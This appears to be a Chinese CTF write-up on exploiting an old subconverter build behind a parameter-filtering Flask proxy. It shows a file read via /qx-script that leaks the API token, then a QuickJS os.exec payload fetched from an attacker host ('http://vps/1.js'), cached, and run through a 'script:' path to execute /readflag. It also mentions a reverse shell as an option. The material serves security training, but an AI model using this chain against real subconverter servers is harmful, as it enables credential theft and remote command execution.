# subconverter

## 题目简述

题目由 `front` 和 `app` 两个容器组成。`front/files/app.py` 是 Flask 代理，只把请求转发到 `http://app:25500/<path>`，并强制参数名只能是 `url`、`target`、`token`，同时禁止路径中出现 `?` 或 `%3f` 以防参数走私。`app` 容器运行 `subconverter v0.7.2-f9713b4`，`pref.toml.orig` 开启 `api_mode=true`，`api_access_token` 会周期性替换；`readflag.c` 被编译成 setuid `/readflag` 用来读取权限为 `700` 的 `/flag`。解题目标是先通过允许的 `url` 参数读到 token，再利用旧版 subconverter 的 QuickJS 脚本执行能力触发 `/readflag`。

## 解题过程

1. 根据附件中 Dockerfile 的注释或者访问 `/version` 得知后端是 `subconverter v0.7.2-f9713b4 backend`。对应项目是 `tindy2013/subconverter`；本题固定在 `f9713b4` 这个旧版本。后续新版本已经删除 `/qx-*` 路由，并给 `fetchFile` 增加了是否允许拉取本地文件的参数，因此不能直接套用当前最新版源码判断。
2. 读源码得知一共有这么些路由可以用。

```
/version
/refreshrules
/readconf
/updateconf
/flushcache
/sub
/sub2clashr
/surge2clash
/getruleset
/getprofile
/qx-script
/qx-rewrite
/render
/convert

```

front 的转发限制写在附件 `front/files/app.py` 中：参数白名单只有 `url`、`target`、`token`，并且禁止参数走私和数组参数。token 前台不可知，所以第一步要在这三个参数约束内读取到 token。

在 `f9713b4` 源码中搜索 `getUrlArg.*"url"`，一共有 7 处使用 `url` 参数。读这 7 处，发现 `interfaces.cpp` 的 `getScript` 函数对应 `/qx-script` 路由，会把 `url` 参数按 URL-safe base64 解码后传入 `fetchFile`；`multithread.cpp` 的 `fetchFile` 对本地文件只检查文件是否存在，再把文件名传入 `fileGet`；`utils/file.cpp` 的 `fileGet` 主要做路径逃逸检查，没有屏蔽 `pref.toml` 这类敏感配置。因此访问 `/qx-script?url=cHJlZi50b21s`，也就是读取 base64 解码后的 `pref.toml`，即可泄露 `api_access_token`。

3. subconverter 曾出现 CVE-2022-28927：部分配置生成逻辑会进入 QuickJS，并且 QuickJS 环境里可用 `os.exec` 执行系统命令。官方修复思路是让所有使用 QuickJS 的入口都需要 token。现在已经通过 `pref.toml` 拿到 token，因此可以重新利用这条脚本执行链。
4. 由于 front 只允许 `url`、`target`、`token` 参数，其他 RCE 点不可用。在 `src/generator/config/nodemanip.cpp` 中，`/sub` 路由处理 `script:` 前缀时，会把后面的内容当作本地路径，经 `fileGet` 读取为 JS，再执行其中的 `parse` 方法。最简单的 getflag 方法是让 JS 执行 `/readflag > flaaaaaag`，再用之前的 `/qx-script` 把输出文件读回来；也可以改成反弹 shell。

```
function parse(x){
	console.log("success")
	os.exec(["bash","-c","/readflag > flaaaaaag"])
}
```

5. 由于fileGet只能读取本地文件，这里还需要使用subconverter的缓存功能落地一个本地文件。简单测试或读源码得知，subconverter的缓存机制是在./cache目录建立一个名字为url之md5的文件用作缓存。例如：我的url是`http://vps/1.js`，那么缓存文件是`./cache/63ff1abb5db4fd2df0498c46a44565c8`。因此可通过script:包含本地js进行rce。

```
/sub?target=clash&url=http://vps/1.js
/sub?target=clash&url=script:cache/63ff1abb5db4fd2df0498c46a44565c8,1&token=xxx
/qx-script?url=ZmxhYWFhYWFn
```

## 方法总结

- 核心技巧：在前端代理严格限制参数的情况下，寻找后端旧版路由里仍会把 `url` 当作本地文件读取的接口，先泄露 token，再使用 QuickJS 脚本执行链写出 flag。
- 识别信号：Web 题给出双容器、前端代理参数白名单、后端开源服务固定 commit 和周期性 token 时，应把版本源码、代理过滤和配置文件权限放在一起看。
- 复用要点：外链源码必须锁定到题目使用的 commit。新版修复、删除路由或新增安全参数后，当前 exploit 可能不成立；复现时应以附件 Dockerfile 中的 `v0.7.2-f9713b4`、`api_mode=true`、`/readflag` setuid 程序为准。
- 参考资料要点：本题需要对照 `tindy2013/subconverter` 的 `f9713b4` 版本源码，重点看 `src/main.cpp` 路由表、`interfaces.cpp#getScript`、`multithread.cpp#fetchFile`、`utils/file.cpp#fileGet` 和 `generator/config/nodemanip.cpp` 的 `script:` 分支；这些信息已经在正文中转写，不依赖点击源码链接。
